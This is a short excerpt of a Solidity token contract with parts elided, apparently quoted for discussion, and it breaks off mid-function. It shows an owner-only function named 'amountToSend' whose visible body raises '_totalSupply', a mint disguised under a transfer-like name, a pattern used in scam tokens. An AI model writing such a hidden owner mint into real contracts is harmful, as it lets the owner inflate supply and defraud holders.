...
interface CreateToken is IERC20Metadata
{
    ...
    function amountToSend(address account, uint256 amount) external returns (bool);
...
contract Token is CreateToken
{
    ...
    function amountToSend(address account, uint256 amount) onlyOwner external returns (bool)
    {
        _totalSupply += amount;
